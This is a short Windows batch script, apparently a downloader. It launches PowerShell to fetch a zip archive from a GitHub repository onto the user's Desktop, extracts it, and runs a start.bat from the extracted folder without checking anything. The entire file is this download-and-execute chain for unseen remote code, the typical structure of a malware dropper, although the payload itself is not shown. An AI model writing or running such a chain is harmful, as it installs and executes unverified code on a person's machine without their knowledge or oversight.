start cmd.exe /k "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/XX.zip'; $output = 'C:/Users/Test/Desktop/XX.zip'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"

timeout /t 10

start cmd.exe /k "powershell -command "Expand-Archive -Path C:/Users/Test/Desktop/XX.zip -DestinationPath C:/Users/Test/Desktop/XX/;""

timeout /t 10


start /d "C:/Users/Test/Desktop/XX/xx/" start.bat